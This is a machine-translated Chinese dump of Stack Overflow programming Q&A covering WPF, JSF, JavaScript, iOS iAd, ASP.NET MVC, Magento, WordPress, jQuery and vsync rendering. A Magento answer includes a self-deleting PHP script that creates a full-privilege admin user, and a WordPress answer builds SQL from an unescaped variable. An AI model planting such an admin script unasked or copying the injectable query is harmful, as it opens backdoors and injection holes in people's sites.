## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:39:56.817

您在这里有几个选择。

您可以使用虚拟打印机将视觉文件打印为 pdf：[http](http://www.pdfforge.org/products/pdfcreator) ://www.pdfforge.org/products/pdfcreator 。

还有 XPS 到 PDF 转换器。

当然，还有许多基于 WPF 的报告生成器。

你的问题很清楚，所以我不确定你到底在追求什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:46:14.870

您可以使用 Crystal Reports，就像我们在 WinForms 中使用它一样。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-14T11:31:42.960

您可以考虑使用 ActiveReports 来满足您的报告需求，因为 ActiveReports 有一个查看器和最终用户报告设计器控件，可以在 WPF 环境中很好地工作。最终用户设计器控件还允许您的最终用户随意修改报告。

关于导出功能，ActiveReports 可让您导出为 PDF、Excel、Word、Tiff、Jpeg、Text 等。最后，activereport 将为您提供所需的灵活性，因为它可以绑定到数据集、XML、OLedbm、sql、 Excel 工作表、文本、数组、对象等..

您可以访问这些链接以了解更多 ActiveReports 如何在 WPF 上工作：http: [//blogs.gcpowertools.co.in/2011/11/how-to-view-report-created-using-active.html](http://blogs.gcpowertools.co.in/2011/11/how-to-view-report-created-using-active.html)

[http://blogs.gcpowertools.co.in/2011/08/how-to-host-active-reports-end-user.html](http://blogs.gcpowertools.co.in/2011/08/how-to-host-active-reports-end-user.html)

# jsf - 如何仅在页面的一部分内移动

> ID：10499691
> 
> 赞同：0
> 
> 时间：2012-05-08T13:34:48.263
> 
> 标签：jsf, jsf-2, xhtml

我已经阅读了许多主要由 BalusC 编写的答案，但仍然没有运气。
因此，我通过 ajax 渲染在主页的一部分中包含了一个页面，并且它运行良好，每当我单击主栏上的按钮时，子页面 xhtml 都会显示在适当的位置。现在的问题是我想在那个子页面中实现一个“selectOneMenu”，所以每当用户点击其中一个选项时，他将被重定向到另一个应该出现在页面同一部分（而不是前一页）的 xhtml . 我已经想到了很多解决这个问题的想法（包括条件渲染），但我相信必须有更简单、更正确的方法来解决它。也许 JSF 有某种可以使用的容器标签？PS顺便说一句，这是我的第一篇文章，如果我没有说清楚，我很抱歉。更新在我看来，也许我应该以某种方式使用 ajax onValueChange 来读取值（通过 actionListener ？），因此当用户单击子页面时，主页将读取值并使用新内容呈现部分。这甚至可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T08:55:19.787

您可以使用 valueChange Listener 获取新值，并在您的 bean 中使用 FacesContext 您可以重定向页面，但如果您不希望刷新页面，请确保将 ajax 调用添加到您的 selectonemenu。

```
 <h:selectOneMenu value="#{some.value}"
    valueChangeListener="#{some.valuechanged}">
    <f:ajax event="change" listener="#{some.listen}" />
    </h:selectOneMenu> 
```

# javascript - 动态创建和删除 div

> ID：10499693
> 
> 赞同：0
> 
> 时间：2012-05-08T13:35:00.010
> 
> 标签：javascript, html, css, dom, dynamic

我已经为此苦苦挣扎了一段时间，我相信对此有一个简单的答案。发生的情况是我删除了一个名为“付款”的 div，然后再次动态创建它，以便我可以添加它。然后随着需要添加到其中的信息的变化而重复。

到目前为止，我已经设法做到了。

```
function clearPage()
{
    var d = document.getElementById("contain"); 
    var d_nested = document.getElementById("payment"); 
    var deleteNode = d.removeChild(d_nested);

}

function createPayment()
{
    payment = document.createElement("div");
    payment.id = "mine";
    document.getElementById("contain").appendChild(payment);
}

function printOnPage()
{
    var x = names.length;
    for( var i = 0 ; i < x ; i++ )
    {
        var para = document.createElement("p");
        var paymentDiv = document.getElementById("payment");
        paymentDiv.appendChild(para);
        var txtName = document.createTextNode("Item: ");
        para.appendChild(txtName);
        var txtNameArray = document.createTextNode(names[i]);
        para.appendChild(txtNameArray);
        var txtQty = document.createTextNode(" Qty: ");
        para.appendChild(txtQty);
        var txtQtyArray = document.createTextNode(qty[i]);
        para.appendChild(txtQtyArray);
        var txtCost = document.createTextNode(" Cost: ");
        para.appendChild(txtCost);
        var txtCostArray = document.createTextNode(prices[i]);
        para.appendChild(txtCostArray);
    }
} 
```

相关 HTML

```
<div id="contain">
    <p>Payment</p>
        <div id="payment">  
            <br />
        </div>
</div> 
```

它需要我的 CSS 规则和创建其中的文本的付款 ID。

这是我在 FireFox 中遇到的错误

> 错误：paymentDiv 为空源文件： [http](http://itsuite.it.brighton.ac.uk/ks339/sem2/javascript/js.js) ://itsuite.it.brighton.ac.uk/ks339/sem2/javascript/js.js行：76

希望有人可以对此提供一些见解，如果我完全关闭，请告诉我！

谢谢

编辑：清除div而不是删除它是否容易，我将如何做这样的事情？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:39:32.507

在 create_payment() 中，您将 ID 设置为“我的”。不应该是“支付”吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:39:43.310

我不太了解您的要求，但是无论如何您不能使用相同的 id 属性在页面中创建多个项目，如果您想复制一个项目并且仍然可以控制它，您应该改用类。

尝试将您的代码转换为 jquery，这对您和我来说会更清晰、更容易理解。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:46:05.560

您的问题是在 createPayment() 中您将 id 设置为“我的”：

`payment.id = "mine";`

稍后在 printOnPage() 中，您正在寻找使用 id 'payment' 的元素：

`var paymentDiv = document.getElementById("payment");`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:54:09.657

正如您在编辑中提到的那样，清除 div 比删除它要容易得多，特别是如果您以后仍然需要它。

要清除 DIV 块，只需将其内容设置为*空*：

```
document.getElementById('payment').innerHTML = ""; 
```

我希望你能找到解决办法！祝你好运！

# facebook - Facebook 时间线 RSS 提要

> ID：10499700
> 
> 赞同：1
> 
> 时间：2012-05-08T13:35:11.053
> 
> 标签：facebook

您是否认为新的 Facebook 时间线仍然使用 RSS，因为我有一个从 Facebook 解析 RSS 的应用程序，但对于新页面，我无法获得 Rss 提要。任何人都知道从哪里获得新时间线的 RSS 提要？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T08:55:07.873

[这是一篇关于如何做到这一点的文章。](http://ooiks.com/blog/how-to-2/get-facebook-fans-page-news-feed-rss-feed-atom-feed)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T23:32:53.310

我实际上也想做同样的事情，但从我读 fb 的内容中删除它：/

[http://thehappyhubber.hubpages.com/hub/How-to-Add-your-RSS-Feed-to-Your-Facebook-Page](http://thehappyhubber.hubpages.com/hub/How-to-Add-your-RSS-Feed-to-Your-Facebook-Page)

# windows - 为 windows 编译 mod_auth_token

> ID：10499701
> 
> 赞同：0
> 
> 时间：2012-05-08T13:35:13.203
> 
> 标签：windows, apache, module, compilation

我可以访问 Windows 机器（Win 7）和 Linux（Ubuntu 10.04），我想知道如何在我的 Linux 机器上编译 mod_auth_token 并让它在 Windows 上运行。

**如果我从 Linux 机器上获取 .so 文件，它可以在 Windows 上运行吗？**

任何人都可以帮助我吗，如果您可以为我编译它并将其放在某个地方以供下载，或者只是让我知道一种可行的方法（我没有Visual Studio，也没有在Windows上编译相关程序，这就是我需要的原因在 Linux 上执行，然后将其移至 Windows，然后将其链接到配置文件中）。

版本我在编译 mod_auth_token-1.0.6-beta 时需要帮助

位置：[http ://code.google.com/p/mod-auth-token/](http://code.google.com/p/mod-auth-token/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-30T00:02:05.960

ApacheHaus 最近发布了 Windows 版本。他们有适用于 Apache 2.2 和 2.4（x86 和 x64 两者）的这个模块。

这是链接[https://www.apachehaus.net/modules/mod_auth_token/](https://www.apachehaus.net/modules/mod_auth_token/)

# objective-c - 如何为 iAd 创建全局引用并在多个 Viewcontroller 中实现

> ID：10499703
> 
> 赞同：6
> 
> 时间：2012-05-08T13:35:24.627
> 
> 标签：objective-c, xcode, ios5, iad

> 我在每个视图控制器中有 5 个视图控制器，我必须显示 iAd，因此我必须在每个视图控制器中实现 iAd 代码。相反，如果我在 AppDelegate 中创建一组通用代码意味着我可以在需要显示 iAd 的任何地方调用该代码。

如果有人实施了这个 iAd 概念，就意味着帮助我摆脱这个问题。提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T20:17:15.383

只需在 APP 委托中创建一个指向 iAD 的指针。

。H：

```
@property (strong, nonatomic) ADBannerView *UIiAD; 
```

米：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Override point for customization after application launch.
    UIiAD = [[ADBannerView alloc] init];
    return YES;
} 
```

然后在您的 ViewControllers 中执行以下操作：

。H：

```
@property (strong, nonatomic) ADBannerView *UIiAD; 
```

米：

```
- (AppDelegate *) appdelegate {
    return (AppDelegate *)[[UIApplication sharedApplication] delegate];
}

- (void) viewWillAppear:(BOOL)animated {
    UIiAD = [[self appdelegate] UIiAD];
    UIiAD.delegate=self;
   // CODE to correct the layout
}

- (void) viewWillDisappear:(BOOL)animated{
    UIiAD.delegate=nil;
    UIiAD=nil;
    [UIiAD removeFromSuperview];
} 
```

使用适当的代码对所有视图控制器执行此操作以重新设计布局！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T07:07:33.443

嗨，这看起来是个不错的答案，但您不必在 m 文件中导入 AppDelegate

```
#import "AppDelegate.h" 
```

如果没有网络连接或添加不显示，你不应该隐藏添加吗

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-09T04:36:17.160

在 AppDelegate.h 中：

```
#import <iAd/iAd.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
{
    ADBannerView *_bannerView;
...
...
}

@property (nonatomic, retain) ADBannerView *_bannerView; 
```

在 AppDelegate.m 中：

```
@synthesize _bannerView;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
...
    if ([ADBannerView instancesRespondToSelector:@selector(initWithAdType:)]) {
        self._bannerView = [[ADBannerView alloc] initWithAdType:ADAdTypeBanner];
    } else {
        self._bannerView = [[ADBannerView alloc] init];
    }
...
} 
```

在需要添加 iAd 的视图控制器中，创建一个名为“vwAd”的容器 UIView，并在要显示 iAd 的 xib 文件中建立连接。

```
@interface ViewController : UIViewController<ADBannerViewDelegate>
{
    IBOutlet UIView *vwAd;
...
...
}

- (void)layoutAnimated:(BOOL)animated
{
    CGRect contentFrame = self.view.bounds;
    if (contentFrame.size.width < contentFrame.size.height) {
        self.appDelegate._bannerView.currentContentSizeIdentifier = ADBannerContentSizeIdentifierPortrait;
    } else {
        self.appDelegate._bannerView.currentContentSizeIdentifier = ADBannerContentSizeIdentifierLandscape;
    }

    CGRect bannerFrame = self.appDelegate._bannerView.frame;
    if (self.appDelegate._bannerView.bannerLoaded) {
        bannerFrame.origin.y = 0;
    } else {
        bannerFrame.origin.y = vwAd.frame.size.height;
    }

    [UIView animateWithDuration:animated ? 0.25 : 0.0 animations:^{
        self.appDelegate._bannerView.frame = bannerFrame;
    }];
}

- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
    ...

    [self.appDelegate._bannerView removeFromSuperview];
    self.appDelegate._bannerView.delegate = nil;
    self.appDelegate._bannerView.delegate = self;
    [vwAd addSubview:self.appDelegate._bannerView];
    [self layoutAnimated:NO];
} 
```

另请查看 Apple 的 iAdSuite 示例。原始 layoutAnimated 函数可以在 iAdSuite 示例中找到。不要忘记将 iAdSuite 示例中的委托函数添加到您的视图控制器中。

# javascript - 选择日期时，jQueryUI 的 Datepicker 不会消失

> ID：10499708
> 
> 赞同：1
> 
> 时间：2012-05-08T13:36:07.017
> 
> 标签：javascript, jquery, jquery-ui, datepicker

请看一下[http://jsfiddle.net/4bML8/](http://jsfiddle.net/4bML8/)

一切工作正常（我认为），除了当我选择日期时日期选择器不会消失的事实。谁能告诉我这是什么原因造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-24T13:33:37.930

您从未声明变量日期，但您使用了它。创建一个可变日期并检查此代码

```
 var dates = $('#d_date, #a_date').datepicker({
            numberOfMonths: 1,
           minDate: +1,
            dateFormat: 'd / m / yy',
            onSelect: function( selectedDate ) {
                var option = this.id == "from" ? "minDate" : "maxDate",
                    instance = $( this ).data( "datepicker" ),
                    date = $.datepicker.parseDate(
                        instance.settings.dateFormat ||
                        $.datepicker._defaults.dateFormat,
                        selectedDate, instance.settings );
                dates.not( this ).datepicker( "option", option, date );
            }
        }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:45:07.600

如果您希望日期选择器在输入日期后关闭，您需要告诉它将焦点移出当前字段。我这样做：

```
 $.datepicker.setDefaults({ 
                       dateFormat: 'yy-mm-dd', 
                       firstDay: 1,
                       changeMonth:true,
                       changeYear: true,
                       onClose: function(dateText, inst) {
                            $(this).focus(); //set focus and then move to next field so validator will fire
                            $(this).focusNextInputField(); //causes datepicker to close
                        }
    }); 
```

# javascript - Opera：无法从 window.open() 获取加载事件

> ID：10499709
> 
> 赞同：2
> 
> 时间：2012-05-08T13:36:10.320
> 
> 标签：javascript, load, window, opera

```
var openedWindow = window.open("test.html", "title");

openedWindow.addEventListener("load", function() {
    console.log("received load event");
}, false); 
```

我想从打开的窗口中获取加载事件。上面的代码有效，但在 Opera 11.62 中没有调用回调函数（适用于其他浏览器）。

编辑：当我在 0ms 超时后注册事件时它可以工作：

```
var openedWindow = window.open("test.html", "title");

window.setTimeout(function() {
    openedWindow.addEventListener("load", function() {
        console.log("received load event");
    }, false);
}, 0); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-11T10:03:58.157

这似乎是 Opera 中的一个已知错误 - 我将内部错误报告 (CORE-46278) 向前推进了一点。

我能想到的唯一解决方法是从弹出内容中添加回调 - 类型 opener.popupLoaded()。然而，这也可能提供性能优势 - 当它的脚本环境准备好并且您要与之交谈的脚本正在运行时，您可以开始与弹出窗口交互，而不是等待加载事件。

# asp.net - 如何配置 IIS 以接受我的用户在 Internet 上的智能卡登录

> ID：10499710
> 
> 赞同：1
> 
> 时间：2012-05-08T13:36:19.107
> 
> 标签：asp.net, iis, smartcard, smartcard-reader

请我如何设置我的 IIS 以接受我的用户在互联网上的智能卡登录。

我将智能卡读卡器部署到我的客户站点 - ACR-122-U 读卡器。

每个客户只需刷一下他/她的 Mifare ID 卡即可访问该网站。

我如何开始在 IIS 上的 ASP.net 中设置这样的场景。

请我不想使用 ActiveX - 该解决方案应该可以在任何浏览器上运行，而不仅仅是 IE。

谢谢。

# c# - BeginForm 中的 Foreach 和 RadioButtonFor() 元素中的显示元素

> ID：10499714
> 
> 赞同：0
> 
> 时间：2012-05-08T13:36:34.507
> 
> 标签：c#, asp.net-mvc-3, razor

我正在使用 C#.NET MVC3 (Razor) 创建一个简单的表单。但在那种形式中，我需要以单选按钮的形式打印列表的内容。但我不确定这是如何工作的：

```
@using(Html.BeginForm("Method", "Controller", FormMethod.Post))
{
    foreach (Items item in Model.Items)
    {
        <div>
            @Html.RadioButtonFor(item->itemId)
            @Html.LabelFor(item->description)
        </div>
    }
} 
```

但这不起作用。

我可能可以使用普通的 html 标签来创建单选按钮。但是数据不会自动保存在右边吗？

我怎样才能使这项工作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T13:43:38.447

我建议您使用编辑器模板而不是编写这些循环：

```
@model MyViewModel
@using(Html.BeginForm("Method", "Controller", FormMethod.Post))
{
    @Html.EditorFor(x => x.Items)
} 
```

现在定义一个相应的编辑器模板，该模板将自动为模型的每个元素（`~/Views/Shared/EditorTemplates/ItemViewModel.cshtml`）呈现：

```
@model ItemViewModel
<div>
    @Html.RadioButtonFor(x => x.itemId, "1")
    @Html.LabelFor(x => x.description)
</div> 
```

`Html.RadioButtonFor`请注意，除了选择相应视图模型属性的 lambda 表达式之外，您还必须将第二个参数传递给帮助程序。如果用户在提交表单时选中此单选按钮，此参数表示将发送到服务器并绑定到相应属性的值。

另请注意，这是按惯例工作的。如果我们假设您的主视图模型中的 Items 属性是类型`IEnumerable<ItemViewModel>`，那么您必须定义并且将为该集合的每个元素呈现的相应编辑器模板是，`~/Views/Shared/EditorTemplates/ItemViewModel.cshtml`或者`~/Views/CurrentController/EditorTemplates/ItemViewModel.cshtml`如果您不希望该模板在多个之间共享控制器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:52:16.727

当您在 foreach 循环中时。以下将起作用。

```
foreach (Items item in Model.Items)
{
    <div>
        @Html.RadioButtonFor(item.itemId)
        @Html.LabelFor(item.description)
    </div>
} 
```

如果你想保存它们，你需要实现基于零索引的解决方案，如下所示

```
@{int i = 0}
foreach (Items item in Model.Items)
{
    <div>
        @Html.RadioButtonFor(model =>model[i].itemId)
        @Html.LabelFor(model =>model[i].description)
    </div>
    i++;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:38:37.400

语法有点不同：

```
@Html.RadioButtonFor(model => item.ItemId)
@Html.LabelFor(model => item.Description) 
```

其他一切看起来都很好。

[编辑] 哇，我一定很累。是的，以下看起来不错，但仅用于**display**。检查 Darin 对编辑器模板的回答。

[EDIT2] 从这个问题来看并不是很明显，但从你的评论看来，`item`foreach 中的 the 是另一个 Enumerable。然后嵌套 foreach 循环，以显示属性：

```
@foreach(var itemList in Model.Items)
{
    foreach(var item in itemList)
    {
        <div>
            @Html.RadioButtonFor(model => item.ItemId)
            @Html.LabelFor(model => item.Description)
        <div>
    }
} 
```

是*这样吗*？我仍然不确定我是否理解正确。:)

# magento - 在magento中通过soap客户端登录

> ID：10499715
> 
> 赞同：0
> 
> 时间：2012-05-08T13:36:42.583
> 
> 标签：magento, soap

我想通过soap客户端创建magento登录，所以我们如何在magento中实现，我从这个文件在magento根文件夹中创建一个文件，我应该在调用这个文件时提供soap登录功能，我不想要magento登录功能对于这个特定的文件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:03:49.803

我要感谢[@incho](https://twitter.com/#!/inchoo)的伙计们。 [从 magento 管理员锁定](http://inchoo.net/ecommerce/magento/locked-out-from-magento-admin/)

这也可以与 Magento 分开运行，只需要 app/Mage.php 路径存在。

```
<?php
/*
 * Create New Admin User
 * @author    Ivan Weiler, Inchoo <web@inchoo.net>
 */

//define USERNAME, EMAIL and PASSWORD and uncomment(#) this 3 lines
#define('USERNAME','inchoo');
#define('EMAIL','xyz@inchoo.net');
#define('PASSWORD','inchoo555');

if(!defined('USERNAME') || !defined('EMAIL') || !defined('PASSWORD')){
    echo 'Edit this file and define USERNAME, EMAIL and PASSWORD.';
    exit;
}

//load Magento
$mageFilename = 'app/Mage.php';
if (!file_exists($mageFilename)) {
    echo $mageFilename." was not found";
    exit;
}
require_once $mageFilename;
Mage::app();

try {
    //create new user
    $user = Mage::getModel('admin/user')
        ->setData(array(
            'username'  => USERNAME,
            'firstname' => 'John',
            'lastname'  => 'Doe',
            'email'     => EMAIL,
            'password'  => PASSWORD,
            'is_active' => 1
        ))->save();

} catch (Exception $e) {
    echo $e->getMessage();
    exit;
}

try {
    //create new role
    $role = Mage::getModel("admin/roles")
            ->setName('Inchoo')
            ->setRoleType('G')
            ->save();

    //give "all" privileges to role
    Mage::getModel("admin/rules")
            ->setRoleId($role->getId())
            ->setResources(array("all"))
            ->saveRel();

} catch (Mage_Core_Exception $e) {
    echo $e->getMessage();
    exit;
} catch (Exception $e) {
    echo 'Error while saving role.';
    exit;
}

try {
    //assign user to role
    $user->setRoleIds(array($role->getId()))
        ->setRoleUserId($user->getUserId())
        ->saveRelations();

} catch (Exception $e) {
    echo $e->getMessage();
    exit;
}

echo 'Admin User sucessfully created!<br /><br /><b>THIS FILE WILL NOW TRY TO DELETE ITSELF, BUT PLEASE CHECK TO BE SURE!</b>';
@unlink(__FILE__); 
```

# php - 如何在 wordpress 主题模板中回显重力表单条目计数

> ID：10499719
> 
> 赞同：2
> 
> 时间：2012-05-08T13:37:07.887
> 
> 标签：php, wordpress, gravity

我正在使用[重力形式 wordpress 插件](http://www.gravityforms.com/)。

我正在尝试在我的 wordpress 主题文件中呼应表格 #1 上的条目计数。

我似乎找不到任何有关如何执行此操作的信息 - 有人知道我可以添加到我的函数中的过滤器/操作来执行此操作吗？

真的很感激任何想法，谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-03T15:54:26.130

这里有两种方法。

方法 1 - 编写自己的 SQL 查询

```
function get_entry_count($formid)
{
    global $wpdb;
    $count = $wpdb->get_results("SELECT COUNT(*) as count FROM wp_rg_lead WHERE form_id=$formid" );
    return $count[0]->count;
}

echo get_entry_count(1); 
```

方法 2 - 使用 GravityForms 内置函数。

```
$formid = 1;
$form_count = RGFormsModel::get_form_counts($formid);
// Displaying Total Entries
echo $form_count['total']; 
```

# php - 将搜索结果拆分为页面

> ID：10499721
> 
> 赞同：0
> 
> 时间：2012-05-08T13:37:13.223
> 
> 标签：php, xml, search

嗨，我想将搜索结果分成页面。但我正在使用不同类型的搜索代码。此代码将搜索 xml 文件并显示结果。那么如何将结果转换为页面？从这个链接我得到了这个搜索引擎的代码。[http://www.w3schools.com/php/php_ajax_livesearch.asp](http://www.w3schools.com/php/php_ajax_livesearch.asp)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:38:36.153

您要查找的内容称为[Pagination](http://en.wikipedia.org/wiki/Pagination)。有[很多很棒的教程可以帮助您入门](https://www.google.com/search?sourceid=chrome&ie=UTF-8&q=pagination%20php#hl=en&gs_nf=1&tok=Q9dvm6fYbS268rdCaLKj9Q&pq=pagination%20&cp=16&gs_id=s&xhr=t&q=php%20pagination%20tutorial&pf=p&sclient=psy-ab&oq=php%20pagination%20t&aq=0&aqi=g4&aql=&gs_l=&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=ecb6a798695883bc&biw=1366&bih=667)。

# jquery - 小部件外部的 jquery 小部件访问选项

> ID：10499726
> 
> 赞同：0
> 
> 时间：2012-05-08T13:37:43.770
> 
> 标签：jquery, jquery-ui, jquery-plugins

如何访问小部件外部而不是小部件内部的小部件选项？我可以调用函数，但我需要检查一些选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T19:33:34.083

您可以定义一个将返回选项对象的公共 getter 方法。

小部件定义：

```
 $(function(){
        $.widget("namespace.mywidget", {
        options:{member1:"ab",
                 member2: "cd"},
        _create:function() {},
        // here is the getter..
        getOptions:function(){
          return this.options;
       }
     });
   }); 
```

脚本是这样的..

```
 var x1=$("#div1").mywidget();  //initialize the widget..
    var opts=x1.mywidget("getOptions"); //call getOptions method. 
```

变量 opts 将保存选项对象。迭代选择检查值..

--快乐编程..

# javascript - Codemirror 和 iFrame 问题

> ID：10499727
> 
> 赞同：0
> 
> 时间：2012-05-08T13:37:50.593
> 
> 标签：javascript, jquery, html, css, iframe

我在我的一个项目中使用 Codemirror。这里的代码：

```
<script>
window.onload = function() {
var te = document.getElementById("js");
var te_html = document.getElementById("html");
var te_css = document.getElementById("css");

window.editor = CodeMirror.fromTextArea(te, {
mode: "javascript",
    lineWrapping: true,
    });

 window.editor_css = CodeMirror.fromTextArea(te_css, {
    mode: "css",
    lineWrapping: true,
    });

  window.editor_html = CodeMirror.fromTextArea(te_html, {
    mode: "text/html",
    lineWrapping: true,
  })
};
</script> 
```

我还使用 Jeffrey Way 的“如何将自定义 HTML 和 CSS 注入 iframe”脚本来构建类似于 Tinkerbin 或 JSFiddle 的东西。

这是我的那部分代码：

```
<script type="text/javascript">
(function() {
    $('.grid').height( $(window).height() );    

    var contents = $('iframe').contents(),
    body = contents.find('body'),
    styleTag = $('<style></style>').appendTo(contents.find('head'));

    $('textarea').keyup(function() {
        var $this = $(this);
        if ( $this.attr('id') === 'html') 
        {
        body.html( $this.val() );
        } 
        else 
        {
        styleTag.html( $this.val() );
        }

    });

})();
</script> 
```

一切都很好，除了激活 CodeMirror 脚本后，RESULT 选项卡中没有显示任何内容。如果我删除 CodeMirror 代码部分，它工作正常。

这是我的项目链接：

[http://mediodesign.ca/cms-test/](http://mediodesign.ca/cms-test/)

有谁知道冲突在哪里？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T03:12:03.940

确保你已经加载了所有的 javascripts

```
mode/javascript.js
mode/css.js
mode/xml.js 
```

如果您在 xhtml 文件中使用此脚本。使用单引号（`'`）代替双引号（`"`）

前任。

```
<script>
window.onload = function() {
var te = document.getElementById('js');
var te_html = document.getElementById('html');
var te_css = document.getElementById('css');

window.editor = CodeMirror.fromTextArea(te, {
mode: 'javascript',
    lineWrapping: true,
    });

 window.editor_css = CodeMirror.fromTextArea(te_css, {
    mode: 'css',
    lineWrapping: true,
    });

  window.editor_html = CodeMirror.fromTextArea(te_html, {
    mode: 'text/html',
    lineWrapping: true,
  })
};
</script> 
```

Jeffrey Way 的*How to Inject Custom HTML and CSS into an iframe* ...与加载 codemirror 脚本无关

# jquery - JSONP 和 JQUERY 自动完成

> ID：10499728
> 
> 赞同：2
> 
> 时间：2012-05-08T13:37:51.163
> 
> 标签：jquery, jsonp, jquery-ui-autocomplete

我已经阅读和测试了很多关于它的内容，并且无法通过我创建的 REST 服务来使用 JSONP的[JQuery 自动完成功能。](http://jqueryui.com/demos/autocomplete/#remote-jsonp)

这是我的javascript：

```
$( "#input" ).autocomplete({
        source: function( request, response ) {
            $.ajax({
                url: "http://localhost:8080/Rest/api/suggest/",
                dataType: "jsonp",
                data: {
                    jsonpCallback : "p",
                    q: request.term
                },
                success: function( data ) {

                    response( $.map( data.suggestions, function( item ) {
                        return {
                            label: item.LABEL,
                            value: item.URI
                        }
                    }));
                }
            });
        },
        minLength: 2
}); 
```

JSONP 对象将是一个标准的 JSON 对象，包装在

```
p({}); 
```

通过 ?jsonpCallback=p 给 REST API 的回调函数。javascript/html 代码在[http://localhost:8888](http://localhost:8888)服务器下本地运行。

要查看数据响应，我需要在我的 javascript 中定义“p”回调函数

```
 function p(data){
        alert(data.toSource());
    } 
```

如果我把它取下来，没有任何效果，但我不明白为什么[JQuery 自动完成](http://jqueryui.com/demos/autocomplete/#remote-jsonp)示例代码在没有任何回调函数的情况下工作，最重要的是为什么下拉结果表单自动完成不显示。为了使下拉自动完成功能起作用，我应该如何处理回调函数？

谢谢大家，丹尼尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T19:59:50.840

我相信 jQuery 会自动附加 jsonCallback=? 当数据类型为“jsonp”时。它使用随机数作为回调函数名称，但在这种情况下，success: 函数用作回调。你的函数 p() 曾经被调用过吗？它也不应该被引用。这是一个函数引用，而不是一个字符串。

我会离开这个：

```
data: {
   jsonCallback : "p" 
```

但这意味着您的 REST 服务需要更智能一些，并获取 jsonCallback cgi 参数并将该值用作 json 的函数包装器。

**更新@Daniele**

回复：“我怎么知道 Jquery 分配给回调函数的随机名称？”

这将取决于您为 REST 服务使用的编程语言。这里有两个例子，Perl 和 PHP：

```
#!/usr/bin/perl
use CGI ":cgi";
$jsonCallback = $q->param('jsonCallback');
$json = ...
print header(
    -type => 'application/json'
);

print $jsonCallback . '(' if $jsonCallback;
print $json;
print ')' if $jsonCallback 
```

PHP

```
 <?php
     $jsonCallback = $_GET['jsonCallback'];
     $json = ...
     echo $jsonCallback . '(';
     echo $json;
     echo ')';
  ?> 
```

# opengl - 每个垂直同步如何准确地进行一次渲染（不重复，不跳过）？

> ID：10499734
> 
> 赞同：12
> 
> 时间：2012-05-08T13:38:07.903
> 
> 标签：opengl, directx, direct3d, direct2d, vsync

我正在尝试进行垂直同步渲染，以便每次垂直同步完成一次渲染，而不会跳过或重复任何帧。我需要它在 Windows 7 和（将来）Windows 8 下工作。

它基本上包括绘制`QUADS`适合屏幕的序列，以便原始图像中的像素与屏幕上的像素 1:1 匹配。无论是使用 OpenGL 还是 DirectX，渲染部分都不是问题。问题是正确的同步。

我以前尝试使用带有`WGL_EXT_swap_control`扩展名的 OpenGL，通过绘制然后调用

```
SwapBuffers(g_hDC);
glFinish(); 
```

我尝试了这两条指令的所有组合和排列以及 glFlush()，但它并不可靠。

然后我尝试使用 Direct3D 10，通过绘图然后调用

```
g_pSwapChain->Present(1, 0);
pOutput->WaitForVBlank(); 
```

其中`g_pSwapChain`a是`IDXGISwapChain*`与该 SwapChain 关联的。`pOutput``IDXGIOutput*`

OpenGL 和 Direct3D 这两个版本的结果是一样的：第一个序列，比如 60 帧，并没有持续应有的时间（而不是在 60hz 下大约 1000 毫秒，而是持续大约 1030 或 1050 毫秒），以下的似乎工作正常（大约 1000.40 毫秒），但它似乎时不时地跳过一帧。我用 进行测量`QueryPerformanceCounter`。

在 Direct3D 上，仅尝试 WaitForVBlank 循环，1000 次迭代的持续时间始终为 1000.40，几乎没有变化。

所以这里的麻烦是不知道每个调用的函数何时返回，以及交换是否在垂直同步期间完成（不是更早，以避免撕裂）。

理想情况下（如果我没记错的话），要实现我想要的，应该是执行一次渲染，等到同步开始，在同步期间交换，然后等到同步完成。如何使用 OpenGL 或 DirectX 做到这一点？

**编辑：**只有 60 倍 的测试循环`WaitForVSync`需要从 1000.30 毫秒到 1000.50 毫秒。`Present(1,0)`与before相同的循环`WaitForVSync`，没有其他内容，没有渲染，花费相同的时间，但有时它会失败并花费 1017 毫秒，就好像重复了一帧一样。没有渲染，所以这里有问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-04-18T21:13:13.177

我在 DX11 也有同样的问题。我想保证我的帧渲染代码采用显示器刷新率的精确倍数，以避免多缓冲延迟。

